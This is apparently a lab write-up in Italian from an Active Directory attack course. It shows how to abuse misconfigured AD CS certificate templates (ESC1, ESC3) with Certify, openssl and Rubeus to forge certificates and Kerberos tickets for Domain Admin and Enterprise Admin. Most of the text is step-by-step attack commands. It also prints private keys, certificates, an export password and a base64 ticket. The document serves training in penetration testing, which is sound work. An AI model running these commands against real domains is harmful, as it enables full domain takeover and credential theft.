# LEARNING OBJECTIVE21

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

1. Check if AD CS is used by the target forest and find any\
   vulnerable/abusable templates
2. Abuse any such template(s) to escalate to Domain Admin and Enterprise\
   Admin.

### SVOLGIMENTO 1

Possiamo utilizzare lo strumento Certify per verificare la presenza di AD CS in moneycorp.

```powershell
C:\AD\Tools\Certify.exe cas
```

<figure><img src="../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

Possiamo elencare tutti i modelli utilizzando il seguente comando. Esaminando l'output possiamo trovare alcuni modelli interessanti.

```powershell
C:\AD\Tools\Certify.exe find
```

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### SVOLGIMENTO2-Elevazione dei privilegi a DA ed EA utilizzando ESC1

Il modello HTTPSCertificates sembra interessante. Cerchiamo di ottenere ulteriori informazioni al riguardo, poiché consente al richiedente di fornire il nome del soggetto:

```powershell
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubjects
```

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ottimo! Il modello HTTPSCertificates concede i diritti di registrazione al gruppo RDPUsers e consente al richiedente di fornire il Subject Name. Ricordiamo che student460 è membro del gruppo RDPUsers. Ciò significa che possiamo richiedere un certificato per qualsiasi utente come student460.

Richiediamo un certificato per Domain Admin - Administrator:

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```

<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Copiamo la chiave privata e il certificato in un file chiamato <kbd>esc1.pem</kbd> ed convertiamo il certificato pem in pfx

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```

Usiamo come Password: SecretPass@123

Utilizziamo il PFX creato sopra con Rubeus per richiedere un TGT per DA - Amministratore!

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt
```

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verifica se ora disponiamo effettivamente dei privilegi DA:

```powershell
winrs -r:dcorp-dc cmd /c set username
```

<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

Fantastico! Possiamo usare un metodo simile per ottenere i privilegi di Enterprise Admin. Richiedere un certificato per EA - Amministratore dobbiamo fare logout/login prima di poter ottenere privilegi di Enterprise Admin

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
```

<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

Creiamo il file pem per poi convertirlo in pfx, usiamo <kbd>SecretPass@123</kbd> come password

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
```

<figure><img src="../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilizza Rubeus per richiedere il TGT per l'Amministratore EA

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1-EA.pfx /password:SecretPass@123 /ptt
```

<figure><img src="../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ora possiamo accedere mcorp-dc

```
winrs -r:mcorp-dc cmd /c  set username
```

<figure><img src="../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation DA e EA usando il template esc3

Se elenchiamo i modelli vulnerabili in moneycorp, otteniamo il seguente risultato:

```powershell
C:\AD\Tools\Certify.exe find /vulnerable
```

<figure><img src="../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

Il modello “SmartCardEnrollment-Agent” dispone di EKU per Certificate Request Agent e concede diritti di enrollment agli utenti del dominio. Se riusciamo a trovare un altro modello con un EKU che consenta l'autenticazione del dominio e abbia requisiti di criteri applicativi dell'certificate request agent, possiamo richiedere certificati per conto di qualsiasi utente.

```powershell
 C:\AD\Tools\Certify.exe find
```

<figure><img src="../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

Ottimo! Ora e' possibile richiedere un Enrollment Agent Certificate dal template “SmartCardEnrollment-Agent”:

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Certificato ottenuto in formato .pem, salvare l'output

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA5h6fR+K05mAnPQyeETsDRMnr2YGpL1g/FRncniQbv1jvhI9Z
70MlRjIM+PoYnlJ6iW5eTrQYdYX/6OPmH4HneWytTGxB4BACBaD44hWwHgC9MRIB
kUJWwZjNc39ks+Hbq0HKbPDajJernaddgNynG5W3b2fg1ELSFcQ8Ds/fHTikIk/4
KD7DCTj0uKAjOxsqr4g07vzybYHo9AmXLyCG8eUBDy33lXm1ZsQP8aoTdExfEpEU
9CG+J/Lx8HXmTivMMTE7CjhDKIW8oeqvWRdMmCT00H0u90hWbm2jJV7ZFmtdu6Qr
lX1Hv1hwkCZ572beHMXvDHlkpQPNOiNEabOPYQIDAQABAoIBAQCvcuOAHGJOTzs7
eZY+jt7EIKuYTxpeBYs7HFevntok/rrHN8CbAne12E05uvzwIPRaOfLfUMJhQERI
HRIELbf9RRWv8c4b9jiEcCGxxlVb2rZkZlUZmhmpS0ZBa/yshWRFY0jh3JTUooLv
FX7d09340yJjZzDsxPGGNPKRXH3AuU9Ph05frV3CClep1Xo8TfWOmXBPFbZ5nbmJ
6qkRupXOAy5eVFp16QCvQEfDfeNBgqxjw/3EnRliPNNjOoi6ww9b/AJ6YHAb1LME
VZUIpQ9/w499D3oNQ0qLy3fz9TLuhl/Q8tPprubrNdrY7zPVoU2bQwre1yx2ecK4
N0jqf7H9AoGBAPxS5P0xFEQbgKeg1RiLykD+DoOSDR0bykSwrEV9dowfTgjFtmK7
G04jEcrJjEtTJ+QI6OifkGz5d7tZruP8MNCqhRETYoli/jwP+mJpAooNQoUNcRuA
3iXbxvgx5q0sHIxqiUc0KjSP3OX3YdGrr/g4x/6IalmLOX4ASp0kzT3/AoGBAOl4
6Vv6D+H7YisagK+NHdK+Jo+x0ifhfRiSI/+xOaL7+0nyKTcdQIvf9F3nX7sw3dRn
EdCGyFedZCUCp9vvMUOd75ci6Bh7JidUsiGswRbZQa8enMe9hTyvIHEMrkkHGYcR
LrR2tJCPJcP0PvQd9aSR2G+JCyiFYADhG/v0YfKfAoGBAMTxqrwZH7ldQhkUxt9G
1RHPeuKlD8lFlKXyxDPlDq+mC5F7SLVdV52wb8W5dOCiQkOR1MElMmRsf1DjWkem
4y8ruXsvhzy24LteuU8wqYO5f888Q6l092/TUEUPJf7KrGnJCedixwKJu6Bfa6Ft
AYecQjXgoinMKo63iYWIYQ5fAoGARiXxH5SLrx9jyIWnApgIzOgbF/OarCbg+j/2
lv29zo2dXANphMjCOwSoHIrHRawSCp6JSLkmesSscT5SBw/gImvSr/tp9ukRdqHI
/7szLNVMGfy9qHn2DVylB7KCryh18BImkUxVRlXsR+sb+ycBRlgXyrNHaf5g8QKx
8MrlnwsCgYB2unnlzoHdrpm2WYowzuoiZZUkuNF0yNzz8947rIo+o8U8YiMZFzU2
ywCEqvN6z0g3UyJXNDgcqPYGLp1gL2hU4fNmqGptGBP2RD7ri4hYwsvDmeJAadHk
1N3vNOL5D4RufPUKIHdB5CUgddaYZtSueXR++Vxd20Stic3ohNO51Q==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGWDCCBUCgAwIBAgITFQAAACobJOTTg8/ViQAAAAAAKjANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNjAxMDkw
ODE2NDdaFw0yODAxMDkwODI2NDdaMHMxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRMwEQYDVQQDEwpzdHVkZW50NDYwMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5h6fR+K05mAnPQyeETsDRMnr2YGp
L1g/FRncniQbv1jvhI9Z70MlRjIM+PoYnlJ6iW5eTrQYdYX/6OPmH4HneWytTGxB
4BACBaD44hWwHgC9MRIBkUJWwZjNc39ks+Hbq0HKbPDajJernaddgNynG5W3b2fg
1ELSFcQ8Ds/fHTikIk/4KD7DCTj0uKAjOxsqr4g07vzybYHo9AmXLyCG8eUBDy33
lXm1ZsQP8aoTdExfEpEU9CG+J/Lx8HXmTivMMTE7CjhDKIW8oeqvWRdMmCT00H0u
90hWbm2jJV7ZFmtdu6QrlX1Hv1hwkCZ572beHMXvDHlkpQPNOiNEabOPYQIDAQAB
o4IDBDCCAwAwPAYJKwYBBAGCNxUHBC8wLQYlKwYBBAGCNxUIheGocofMn2jhhyaC
n65RgvL2fYE/guHdfLntDQIBZAIBBTAVBgNVHSUEDjAMBgorBgEEAYI3FAIBMA4G
A1UdDwEB/wQEAwIHgDAdBgkrBgEEAYI3FQoEEDAOMAwGCisGAQQBgjcUAgEwHQYD
VR0OBBYEFIyKnQxKH6gHydqtDE3TNzcwdqQYMB8GA1UdIwQYMBaAFNH+jQqn+rQy
nzb8ILj3y55oxUXtMIHYBgNVHR8EgdAwgc0wgcqggceggcSGgcFsZGFwOi8vL0NO
PW1vbmV5Y29ycC1NQ09SUC1EQy1DQSxDTj1tY29ycC1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1tb25leWNvcnAsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF
BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPW1vbmV5Y29ycC1N
Q09SUC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1tb25leWNvcnAsREM9bG9jYWw/
Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
b3JpdHkwQAYDVR0RBDkwN6A1BgorBgEEAYI3FAIDoCcMJXN0dWRlbnQ0NjBAZG9s
bGFyY29ycC5tb25leWNvcnAubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
AYI3GQIBoDAELlMtMS01LTIxLTcxOTgxNTgxOS0zNzI2MzY4OTQ4LTM5MTc2ODg2
NDgtMjA2MjAwDQYJKoZIhvcNAQELBQADggEBAKnARzd+hRS673dN7aivSeOTd0PQ
AnRIFbFjBuLHjvopb7/XRUwKPqgjAZwUo8/O5d6ZGTj+ur6iEwxiMNOOQ0G9GFwG
tUNqELxeURGT7bXiWOhX8ha0vUuZcUnyhPrD3pXsuB9BoCBko7pTtST8y+JoI26b
wZuMkiee9D7zGE2Zr0yYXzya3c3Ps4B1TigOB7tS2f60Sk6urndAybsM8JkLKZZJ
TXMIptY0fB8XKEqHJ/Zf1mkVAEWEtvCA30ps+70EKV7vX6gKv/Y2r0N423pHx5HR
dWT/PQ93ZJbrk8Ym4WgYdaCF3uQ0sRHpFyHa2s0PJyfz5idtFAHAAFO2siU=
-----END CERTIFICATE-----
```

Come in precedenza, salvare il testo del certificato(compresa la Key) in esc3.pem e convertirlo in pfx. Utilizzare SecretPass@123 come password di esportazione:

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Ora possiamo utilizzare Enrollment Agent Certificate per richiedere un certificato per DA dal modello SmartCardEnrollment-Users.

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
```

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Ora possiamo utilizzare Enrollment Agent Certificate per richiedere un certificato per DA dal modello SmartCardEnrollment-Users:

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAv9lAiJGYl3SckrBYIeFyd9gFNTDRuGxOwKH8TvO+us3pS8v+
gMc8EhKV6lBh0vFxh7nBYSC9An8PDoUrkfjGASj7IWsocx8KRGvDWu+s4NLSlVXu
rjPqO004r8i9oA+Y0pwEwk83uQnTpLD7WoeX4+THvEZz4//GYVWCWpMo4UEpRp1k
TsIHmqyIDvhSbnAd1Lj/wrsjQa0Lc9r9tTqVFlqdaNAUWYIeA76QQKyJ5KVDDznZ
FTl3gRcVUOS7obJrZ4C+teKt9DzRM2yhA0CMm04IFHyIUZkVAHJIXPZ0M1bBeesU
S3aHVJgnocOl2ywQNW60dz7VZk0dEUamUDsnvQIDAQABAoIBAQCWRw+N6r6kpOug
3BGtOHP5/HTX3Y3p8K0fp8OD9NqKaZE9lmWdanNblMNp790w54AO2SrpckOcGPsq
XJZsmXpAnmFZJB9jTgU041T7fpLk6T+bStzUCEaKfUrSJ2SiZJVJJH1116fGgjQO
5bN+jogkM6lhia5uAoTa6ahaWrvC9XQX9gblEyi5v9gCyF1DviyXFvPO4BsHM/Pk
H04IhZcdq1kntwM52Zzv1K6PTzYQKGW6VQjL+eYDJpgCWDttJqgl01hb038ja7Lh
4PCYh6Ha+qFpuK/nMuSFyqOfuJUItHbwbglLOR8G5sJ+0i7oaXOcJijkEQOnwvl8
W34YxojhAoGBAOs8noEbYTtQ/wcw6hkf1Hm9mP7vTnPQF8Fa4xtYV7ARMb1iC8Dg
Z05R3rq9FLR2hBFEdJkDYJUIWd4zYDivhFae4g5vg82UC95Pd/daMl7w1innq2Jb
GLdkaD4UJl4rjPYP0B1U9J3tzB7zK5aVjq9uLNvdkqbMMaqtggnqhU9XAoGBANDI
PV4E2feWlzGf8E2Xt3IJdq2ykn7Q+ZFO2WT6DPwQCdfppLcfwgNj6dDJYP4V2hLw
vGDRUzrPzgjp0FI/mps+fUQ0whQBB6CFd7PJP6zLjtMuuK9l/cYg4/llwUL8DUwM
XpOUoqdMCgWzt4wgl1+2kps7bvIy1BH4G+09wNkLAoGBAKGHbKfm7ytWAOklM3qx
GqvF/2r/VHW+LLG/ATfjv8LM68TJsJxu+0ESgsjj0XXh8+oPgakYYpeztlIYITiL
fWoli8Cx3mWqBURQeWZGb1Q2ODlqNYtCVoSH0/TczUPYz+CfFx8tGRPhGEsgW4v5
gpMAKpmHWo5ipLA4mJTKj2PdAoGACW7SnvnXI0GRiTNxtv/A0Q0uaICl78bfT7ph
RheqGIVc/H1Y7NEpgd+0w7Mlh7VTCgIIcNNkUEbtRyfROrYW9SaooDlF/4NgZddB
5kSUdOkphc8ZlwsjoR0BT9ZSGgWrUCFK8J4Jj0d3OHS7OUCLtk5YZ10TESxMupcc
I+bjXKsCgYAP8H/lQQtakzAic9fq/y9Tuk+sLMin9rMvy0f/on2LEsrUY3DciOto
bHzPLXXMeZTwUWvcsrBJX+vilxdIR29P1dYiD4ChBMYuLSz4UunTu9LBXvf6C2HN
dkHz/eH0TqEu9IJ6xRyGq9YNst3geuLGKB4bBkC6M+mvbkq9jrzOlA==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGiTCCBXGgAwIBAgITFQAAACvdPeLF6YFp3wAAAAAAKzANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNjAxMDkw
OTAwMzNaFw0yODAxMDkwOTEwMzNaMHYxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRYwFAYDVQQDEw1BZG1pbmlzdHJhdG9yMIIB
IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv9lAiJGYl3SckrBYIeFyd9gF
NTDRuGxOwKH8TvO+us3pS8v+gMc8EhKV6lBh0vFxh7nBYSC9An8PDoUrkfjGASj7
IWsocx8KRGvDWu+s4NLSlVXurjPqO004r8i9oA+Y0pwEwk83uQnTpLD7WoeX4+TH
vEZz4//GYVWCWpMo4UEpRp1kTsIHmqyIDvhSbnAd1Lj/wrsjQa0Lc9r9tTqVFlqd
aNAUWYIeA76QQKyJ5KVDDznZFTl3gRcVUOS7obJrZ4C+teKt9DzRM2yhA0CMm04I
FHyIUZkVAHJIXPZ0M1bBeesUS3aHVJgnocOl2ywQNW60dz7VZk0dEUamUDsnvQID
AQABo4IDMjCCAy4wPQYJKwYBBAGCNxUHBDAwLgYmKwYBBAGCNxUIheGocofMn2jh
hyaCn65RgvL2fYE/hrSlX4e6+hgCAWQCAQkwKQYDVR0lBCIwIAYIKwYBBQUHAwQG
CisGAQQBgjcKAwQGCCsGAQUFBwMCMA4GA1UdDwEB/wQEAwIHgDA1BgkrBgEEAYI3
FQoEKDAmMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQwCgYIKwYBBQUHAwIwHQYD
VR0OBBYEFK4BCUHNhriVKPWSPAbj1M4RhWheMB8GA1UdIwQYMBaAFNH+jQqn+rQy
nzb8ILj3y55oxUXtMIHYBgNVHR8EgdAwgc0wgcqggceggcSGgcFsZGFwOi8vL0NO
PW1vbmV5Y29ycC1NQ09SUC1EQy1DQSxDTj1tY29ycC1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1tb25leWNvcnAsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF
BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPW1vbmV5Y29ycC1N
Q09SUC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1tb25leWNvcnAsREM9bG9jYWw/
Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
b3JpdHkwQwYDVR0RBDwwOqA4BgorBgEEAYI3FAIDoCoMKGFkbWluaXN0cmF0b3JA
ZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWwwTQYJKwYBBAGCNxkCBEAwPqA8Bgor
BgEEAYI3GQIBoC4ELFMtMS01LTIxLTcxOTgxNTgxOS0zNzI2MzY4OTQ4LTM5MTc2
ODg2NDgtNTAwMA0GCSqGSIb3DQEBCwUAA4IBAQBjuZxVqxCCvwI9Ai9hAmvxUdD5
AxpCUFVB+XvXfGT2bVuwVtrD2kXorPukfLgd+u5FDYt5U8ff/y6+sP/CVzZI0wTh
48Jyww9VZ8ZBpXvirtrQD4dhyCjsytTSm6CzjAPY886j5h6r6qPopbV3IRdb7TGo
aaKmVbErX/g2K7n3u7itGE/I3hYnKzQ2JUCmsxYi6zcspfVK0B70kGFrEcRjZjZR
P3CwTCps0QM+QrAKX7Z8CoF+DcGtGo1dLQN1BgbircSfwzGnujz4uhXSjVG+fdDi
hpfiCDnnwlMnoVv8akpISId62EBVkvi/72jvNMgwnsdHlZdEMz1NvCXF2gRo
-----END CERTIFICATE-----
```

Ancora una volta, salva il testo del certificato in esc3-DA.pem e converti il pem in pfx. Continua a utilizzare SecretPass@123 come password di esportazione:

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
```

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Utilizzare l'esc3-DA creato sopra con Rubeus per richiedere un TGT per DA.

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc3-DA.pfx /password:SecretPass@123 /ptt
```

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

```
[*] base64(ticket.kirbi):

      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
      ZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWw=
```

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Verifica se ora disponiamo effettivamente dei privilegi DA:

```powershell
winrs -r:dcorp-dc cmd /c set username
```

<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

Per passare a Enterprise Admin, è sufficiente apportare modifiche alla richiesta al template SmartCardEnrollmentUsers e a Rubeus. Si noti che qui stiamo utilizzando “/onbehalfof: mcorp\administrator” mentre prima avevamo usato "/onbehalfof:dcorp\administrator" :&#x20;

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEArMuomOUQsmAiLK2twfHo2mHlmVI3P2PLKQczwZzAI7WUwBPw
ZZFnNEkJjjTZPlW77IUl0YWQiIn+uiUJfF9Gann4Ql4ubtAcyWVui/SEpDkZ119U
D6rr0nU+oRVWzrq+PIZ0U7ZNRdX3eTLlPP9D933oH+PP0O/4nf7Do1P6WVQpVFhL
AF54itawRRA4Je3Uw8lJ8ZZaNJYfYGCZCIfb8JjlD+4vrC3JFWtfjcfce4mOt28w
Es/5w5iDBxxnfmEjkM4JqkpA5e99YUTMwks7+PO16y4tY3+7Xc+HL2BUt+dySewC
lUFCjx81lH1Bd17hC4ExDAg9VjzXLRuyH00j4QIDAQABAoIBAQCgArfNXdFoXL1I
wkv1HR6Tm7QRlqCygqbPB2xWDeGfL7bfZ5dldpArSrceiLHjl2C+VU4AB78fsSnB
FisCkPeUAf5y9uPoma8OkG8eCwAJUxcq6YveNljKOugUIr6QET24rolqO5ay5MCV
6xt8sKUvudgKL9txj8aaCCECTfG2ZUOYzwTWmrVPW1iHYhiXQvqsDaMcEfRBeNIV
1IbnRaw9Lu6ZauZbF7vPIJy/ZC30KKMNfUPemXxBwB0Yd7Zv9+Ur9b/Lpb/Rdaa/
eztPm1p9moSnTb4RKtejzNqLCDg3Di/HnedY4rAThhTp6kkLQwziid53PE4eZLeT
zWNdkHBBAoGBANLbppR2AFvFAY4lZdPPpTryoknKxfULSu6hjGwzkbS1tM1wAYzq
